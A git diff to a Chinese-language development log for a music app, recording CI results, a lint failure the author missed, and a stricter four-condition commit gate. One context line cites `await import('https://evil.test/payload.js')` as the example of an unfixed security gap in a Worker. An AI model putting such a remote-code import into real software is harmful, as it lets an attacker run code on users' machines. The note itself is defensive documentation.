@@ -882,7 +882,15 @@ web/Android 产物里拿到的是**同一个 Node 构建** ⇒ 带 File 传输�
 | `function unsupportedCapability ()` 改回 `() =>` | **fail 1** —— 同上（就是上面第 3 条的缺陷） |
 | 未变异对照 | exit 0 |
 
-单测 470 / 470、四个 tsc exit 0。
+单测 470 / 470、四个 tsc exit 0。`npm run verify` 本机 exit 0。
+
+**CI**：`d5e89d3b` 的 `verify/build` 红在一句 lint（`space-before-function-paren`，见 §7.2 的教训
+—— 我漏跑了 `build`），`aacda29b` 修掉后 **`verify` 与 `debug-apk` 双绿**，
+两个矩阵全 success：`typecheck/test:unit/build` = success，
+`settings-controls / settings-layout / player / compact-lyrics / lyric-security /
+responsive-layout / window-controls / window-controls-shell` 全 success
+（`verify` run [`38869658508`](https://github.com/chaoy1/Rain-Music/actions/runs/38869658508)，
+`debug-apk` run `38869658509`；这次"5 红 3 绿"的分布也正好对照验证了 §7.2 里那个"build 红会连带 UI 套件红"的机制）。
 
 #### ⚠️ 6.4.6b 同批实测出的**真口子**：Worker 里的动态 `import()`（**未修，需拍板**）
 
@@ -1011,13 +1019,24 @@ await import('https://evil.test/payload.js')   // 在自定义源的 Worker 里
 
 **"CI 绿 ≠ 功能对"**：`MainActivity` 漏提交那次就是这类（CI 全绿而真机静默失效）。
 
-### 7.2 提交门（三条件，**缺一不可**）
+### 7.2 提交门（四条件，**缺一不可**）
 
 ```
 静默 >3 分钟（目标文件 mtime 不再变化）
+且 npm run verify 全绿（= typecheck + test:unit + build）   ← 2026-10-16 新增，见下面的教训
 且 node --test tests\unit\*.test.cjs 的 fail = 0
-且 tests >= 基线（**工作区口径 455**，2026-10-15 复跑值；提交快照口径以 CI 为准）
+且 tests >= 基线（**工作区口径 470**，2026-10-16 复跑值；提交快照口径以 CI 为准）
 ```
+
+- ⚠️ **只跑 `typecheck` + `test:unit` 不算过门 —— 必须跑 `build`**（或直接 `npm run verify`）。
+  lint **在 `build` 里面**（`build-config/pack.js:23-26`：先 eslint，非零就 `process.exit`）。
+  2026-10-16 我就漏了这一步：本机 typecheck + 470 单测全绿就推了，CI 上
+  `verify/build` 红在一句 `space-before-function-paren`（`function name ()` 多了个空格）。
+- ⚠️ **`build` 红了会连带 5 个 UI 套件红**（看起来像"改动把 UI 弄坏了"，其实只是一个根因）：
+  那些套件加载**构建产物** —— `tests/ui/settings-controls.electron.cjs:133` 直接
+  `require(path.join(root, 'dist/main.js'))`，而 CI 是干净检出、`dist/` 只由 `verify/build` 产生。
+  当时红的正是"要 dist 的 5 个"，绿的是自包含的 `compact-lyrics` / `window-controls` /
+  `window-controls-shell` 3 个。**看到这种红绿分布，先去查 `verify/build`，不要先怀疑 UI 代码。**
 
 - **必须从实际运行输出解析 `tests/pass/fail` 三个数**，不能只看 exit code。
   （旧文写的是 `ℹ tests/pass/fail`；本机 Node 输出的是 `? tests` 那种行 —— **认数字，不要认前缀字符**。）
